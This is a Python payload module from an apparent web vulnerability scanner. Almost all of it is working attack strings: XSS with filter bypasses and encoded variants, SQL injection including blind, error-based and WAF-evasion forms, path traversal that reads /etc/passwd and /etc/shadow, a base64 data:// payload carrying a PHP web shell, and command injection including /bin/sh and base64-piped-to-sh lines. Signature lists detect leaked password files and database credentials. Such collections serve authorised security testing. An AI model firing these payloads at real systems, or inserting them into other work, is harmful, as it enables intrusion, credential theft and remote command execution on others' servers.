"""
cyberm4fia-scanner - Payloads and Signatures
All payloads and detection patterns in one place.
Supports loading custom payloads from payloads/*.txt files.
"""

import os

_PAYLOAD_DIR = os.path.join(
    os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "payloads"
)


def load_payloads_from_file(filename, fallback=None):
    """Load payloads from a .txt file in payloads/ dir.

    Lines starting with # are comments and are skipped.
    Returns merged: file payloads + unique fallback payloads.
    If file doesn't exist, returns fallback only.
    """
    filepath = os.path.join(_PAYLOAD_DIR, filename)
    if fallback is None:
        fallback = []

    if not os.path.exists(filepath):
        return list(fallback)

    file_payloads = []
    with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            stripped = line.strip()
            if stripped and not stripped.startswith("#"):
                file_payloads.append(stripped)

    # Merge: file payloads first, then unique hardcoded
    combined = list(file_payloads)
    for p in fallback:
        if p not in combined:
            combined.append(p)

    return combined


# XSS Payloads
XSS_PAYLOADS = {
    "basic": [
        "<script>alert(1)</script>",
        '"><script>alert(1)</script>',
        "'><script>alert(1)</script>",
    ],
    "svg": [
        "<svg/onload=alert(1)>",
        "<svg onload=alert`1`>",
        "<svg><animate onbegin=alert(1) attributeName=x>",
        "<svg/onload=confirm(1)>",
        "<svg onload=prompt(1)>",
        "<svg><set onbegin=alert(1) attributename=x>",
    ],
    "img": [
        "<img src=x onerror=alert(1)>",
        "<img/src=x onerror=alert(1)/>",
        "<img src=x:x onerror=alert(1)>",
        '<img src="" onerror="alert(1)">',
        "<img src=1 onerror=alert(1)//>",
    ],
    "event": [
        '" onmouseover="alert(1)',
        "' onfocus='alert(1)' autofocus='",
        "<body onload=alert(1)>",
        '" onfocus=alert(1) autofocus x="',
        "' onblur=alert(1) autofocus tabindex=0 '",
        '" onclick="alert(1)',
        "<input onfocus=alert(1) autofocus>",
        "<select onfocus=alert(1) autofocus>",
        "<textarea onfocus=alert(1) autofocus>",
    ],
    "html5": [
        "<details/open/ontoggle=alert(1)>",
        "<marquee onstart=alert(1)>",
        "<video><source onerror=alert(1)>",
        "<audio src=x onerror=alert(1)>",
        "<video src=x onerror=alert(1)>",
        "<iframe src=javascript:alert(1)>",
        "<object data=javascript:alert(1)>",
        "<embed src=javascript:alert(1)>",
        "<math><mtext><table><mglyph><svg><mtext><textarea><path id=x xmlns=http://www.w3.org/2000/svg><animate attributeName=href values=javascript:alert(1) /><a id=y><rect width=100 height=100 /><set attributeName=href to=javascript:alert(1) /></textarea></mtext></svg></mglyph></table></mtext></math>",
    ],
    "bypass": [
        "<scr<script>ipt>alert(1)</scr</script>ipt>",
        "<<script>script>alert(1)</<script>/script>",
        "<SCRIPT>alert(1)</SCRIPT>",
        "<ScRiPt>alert(1)</ScRiPt>",
        "<script >alert(1)</script >",
        "<script\x20>alert(1)</script>",
        "<script\n>alert(1)</script>",
        "<script\t>alert(1)</script>",
    ],
    "encoding": [
        "<img src=x onerror=\u0061lert(1)>",
        "<svg/onload=\u0061\u006c\u0065\u0072\u0074(1)>",
        "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>",
        "<svg/onload=eval(atob('YWxlcnQoMSk='))>",
        '<a href="javascript&#58;alert(1)">click</a>',
        '<a href="java\x0ascript:alert(1)">click</a>',
        '<a href="\x6aavascript:alert(1)">click</a>',
    ],
    "template": [
        "{{7*7}}",
        "${7*7}",
        "#{7*7}",
        "{{constructor.constructor('alert(1)')()",
        "<%= 7*7 %>",
    ],
}

XSS_FLAT_PAYLOADS = [
    "<script>alert(1)</script>",
    '"><script>alert(1)</script>',
    "'><script>alert(1)</script>",
    "<svg/onload=alert(1)>",
    "<svg onload=alert`1`>",
    "<img src=x onerror=alert(1)>",
    '" onfocus="alert(1)" autofocus x="',
    "<details/open/ontoggle=alert(1)>",
    "'\"--></style></script><script>alert(1)</script>",
    "<ScRiPt>alert(1)</sCrIpT>",
    "javascript:alert(1)",
    "<body onload=alert(1)>",
    '{{constructor.constructor("alert(1)")()}}',
    # Polyglot & Obfuscated XSS
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/-->\\x3csVg/<sVg/oNloAd=alert()//>//>\\x3e",
    "<script>alert(String.fromCharCode(88,83,83))</script>",
    "<img src=x onerror=alert(1)//>",
    "<svg/onload=alert(1)//",
    # Advanced bypass
    "<input onfocus=alert(1) autofocus>",
    "<select onfocus=alert(1) autofocus>",
    "<textarea onfocus=alert(1) autofocus>",
    "<audio src=x onerror=alert(1)>",
    "<video src=x onerror=alert(1)>",
    "<marquee onstart=alert(1)>",
    '<a href="javascript:alert(1)">click</a>',
    "<iframe src=javascript:alert(1)>",
    "<svg/onload=confirm(1)>",
    "<img src=x onerror=\u0061lert(1)>",
    "<svg/onload=eval(atob('YWxlcnQoMSk='))>",
    "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>",
    # Template injection
    "{{7*7}}",
    "${7*7}",
]

# SQLi Payloads
SQLI_PAYLOADS = [
    "'",
    '"',
    "' OR '1'='1",
    '" OR "1"="1',
    "1' OR '1'='1'--",
    '1" OR "1"="1"--',
    "' OR 1=1--",
    '" OR 1=1--',
    "admin'--",
    "' UNION SELECT NULL--",
    "' AND 1=1--",
    "' AND 1=2--",
    "1' ORDER BY 1--",
    "1' ORDER BY 10--",
    # Integer based (medium bypass)
    "1 OR 1=1",
    "1 OR 1=1#",
    "1 OR 1=1--",
    "1 AND 1=1",
    "1 AND 1=2",
    "1 UNION SELECT null",
    "1 UNION SELECT null#",
    "1 ORDER BY 1",
    "1 ORDER BY 10",
    # UNION multi-column
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "1 UNION SELECT null,null",
    "1 UNION SELECT null,null,null",
    # Comment tricks
    "1'/**/OR/**/1=1--",
    "1'/*!OR*/1=1--",
    "1'+OR+1=1--",
    "1'%0aOR%0a1=1--",
    # WAF evasion
    "' oR '1'='1",
    "' Or '1'='1'--",
    "1'||1=1--",
    "' HAVING 1=1--",
    "' GROUP BY 1--",
    # Stacked queries
    "'; SELECT 1--",
    "1; SELECT 1--",
    # Error-based
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
    "' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)--",
    "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--",
]

BLIND_SQLI_PAYLOADS = [
    "1' AND SLEEP(2)--",
    "1' AND SLEEP(2)#",
    '1" AND SLEEP(2)--',
    "1' WAITFOR DELAY '0:0:2'--",
    "1' AND pg_sleep(2)--",
    "1 AND SLEEP(2)#",
    "1 AND SLEEP(2)--",
    "1 AND SLEEP(2)",
    "1 AND 1=1",
    "1 AND 1=2",
    "1 AND BENCHMARK(5000000,SHA1('test'))",
    # Legacy & WAF Bypass Payloads
    "' OR SLEEP(2)--",
    "'; WAITFOR DELAY '0:0:2'--",
    "1; WAITFOR DELAY '0:0:2'--",
    "' AND (SELECT * FROM (SELECT(SLEEP(2)))a)--",
    "' OR pg_sleep(2)--",
    "%00' OR 1=1--",
    "1' OR '1'='1",
    '1" OR "1"="1',
]

SQLI_ERRORS = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "sql syntax",
    "mysql_fetch",
    "mysqli_",
    "pg_query",
    "postgresql",
    "ora-0",
    "ora-1",
    "sqlite3",
    "sqlstate",
    "odbc",
    "microsoft sql server",
    "syntax error",
    "invalid query",
    "sql command not properly ended",
]

BLIND_SQLI_THRESHOLD = 1.0

# LFI Payloads
LFI_PAYLOADS = [
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "../../../../../../etc/passwd",
    "../../../../../../../etc/passwd",
    "....//....//....//etc/passwd",
    "....//....//....//....//etc/passwd",
    "..%2f..%2f..%2fetc/passwd",
    "..%252f..%252f..%252fetc/passwd",
    "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    "/etc/passwd",
    "/etc/shadow",
    "../../../etc/passwd%00",
    "../../../etc/passwd%00.php",
    "..\\..\\..\\windows\\system.ini",
    "C:\\windows\\system.ini",
    "php://filter/convert.base64-encode/resource=index.php",
    "php://filter/convert.base64-encode/resource=../config.php",
    "file1.php/../../../etc/passwd",
    "file2.php/../../../etc/passwd",
    "file:///etc/passwd",
    "file:///etc/hosts",
    "file:///etc/shadow",
    "file://C:/Windows/win.ini",
    "file://C:/Windows/System32/drivers/etc/hosts",
    # Advanced Wrappers & Tricks
    "php://filter/read=convert.base64-encode/resource=index.php",
    "php://filter/read=string.rot13/resource=index.php",
    "php://filter/resource=/etc/passwd",
    "php://input",  # Requires POST data
    "expect://id",
    "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+",  # <?php system($_GET['cmd']); ?>
    # Traversal Tricks (if startswith 'file' is enforced but not 'file://')
    "file/../../../../etc/passwd",
    "file/../../../../../../../../etc/passwd",
    "include.php/../../../../etc/passwd",
    # Null Byte (Legacy PHP < 5.3.4)
    "../../../etc/passwd%00",
    "fi.php/../../../../etc/passwd",
    # Double Encoding
    "%252e%252e%252fetc%252fpasswd",
]

LFI_SIGNATURES = {
    "linux": ["root:x:0:0:", "daemon:", "/bin/bash", "/bin/sh", "nobody:", "www-data:"],
    "linux_shadow": ["root:$", "root:!", "root:*"],
    "linux_hosts": ["127.0.0.1", "localhost"],
    "linux_proc": ["PATH=", "SHELL=", "USER="],
    "windows": ["[drivers]", "[extensions]", "for 16-bit app support", "[boot loader]"],
    "php_source": ["<?php", "<?=", "PHBocA==", "PD9waHA="],
    "config": ["DB_PASSWORD", "DB_HOST", "mysql_connect", "mysqli_connect"],
}

# RFI Payloads (Remote File Inclusion)
RFI_PAYLOADS = [
    "http://google.com/robots.txt",
    "http://www.google.com/robots.txt",
    "https://google.com/robots.txt",
    "http://127.0.0.1/robots.txt",  # Loopback test
    # Bypasses
    "hTTp://google.com/robots.txt",
    "http://google.com/robots.txt%00",
    "http://google.com/robots.txt?",
]

RFI_SIGNATURES = [
    "User-agent: *",
    "Disallow:",
]

# Command Injection Payloads
CMDI_PAYLOADS = [
    "; whoami",
    "| whoami",
    "|| whoami",
    "& whoami",
    "&& whoami",
    "`whoami`",
    "$(whoami)",
    "127.0.0.1; whoami",
    "127.0.0.1 | whoami",
    "127.0.0.1 || whoami",
    "127.0.0.1 & whoami",
    "127.0.0.1 && whoami",
    "127.0.0.1; id",
    "127.0.0.1 | id",
    "127.0.0.1 && id",
    "127.0.0.1\nwhoami",
    "127.0.0.1%0awhoami",
    "127.0.0.1|$(whoami)",
    "127.0.0.1|`whoami`",
    "; sleep 5",
    "| sleep 5",
    "127.0.0.1; sleep 5",
    "&& sleep 5",
    # Quote bypass
    "127.0.0.1; w'ho'am'i",
    '127.0.0.1; w"ho"am"i',
    "127.0.0.1|w'ho'am'i",
    '127.0.0.1|w"ho"am"i',
    # Newline/CRLF
    "127.0.0.1%0awhoami",
    "127.0.0.1%0dwhoami",
    "127.0.0.1%0a%0dwhoami",
    # Brace expansion
    "127.0.0.1;{whoami}",
    "127.0.0.1|{whoami}",
    "127.0.0.1;$(whoami)",
    "127.0.0.1|$(whoami)",
    # Shell access
    "|/bin/sh",
    ";/bin/sh",
    # IFS bypass (spaces filtered)
    "127.0.0.1;cat$IFS/etc/passwd",
    "127.0.0.1;cat${IFS}/etc/passwd",
    "127.0.0.1;cat$IFS$9/etc/passwd",
    "127.0.0.1;{cat,/etc/passwd}",
    # Variable expansion
    "127.0.0.1;$({find,/,-name,passwd})",
    "127.0.0.1;a]whoami",
    # Tab bypass
    "127.0.0.1;\twhoami",
    "127.0.0.1;cat\t/etc/passwd",
    # Wildcard bypass
    "127.0.0.1;/???/??t /???/p??s?d",
    "127.0.0.1;cat /e?c/p?ss?d",
    # Hex/octal encoded
    '127.0.0.1;$(printf "\\x77\\x68\\x6f\\x61\\x6d\\x69")',
    "127.0.0.1;echo d2hvYW1p|base64 -d|sh",
    # No-space pipe bypass (DVWA high filters '| ' but not '|')
    "127.0.0.1|whoami",
    "127.0.0.1|id",
    "127.0.0.1|cat /etc/passwd",
    # Windows
    "127.0.0.1 & whoami",
    "127.0.0.1 | type C:\\windows\\system.ini",
    "& ipconfig",
    "| dir",
]

CMDI_SIGNATURES = {
    "linux_whoami": ["root", "www-data", "apache", "nginx", "daemon"],
    "linux_id": ["uid=", "gid=", "groups="],
    "windows_whoami": ["nt authority\\system", "administrator"],
    "windows_dir": ["<DIR>", "Volume Serial Number", "Directory of"],
}


# Payload encoder utilities
class PayloadEncoder:
    @staticmethod
    def double_url_encode(p):
        return p.replace("<", "%253C").replace(">", "%253E")

    @staticmethod
    def mixed_case(p):
        return "".join(c.upper() if i % 2 else c.lower() for i, c in enumerate(p))
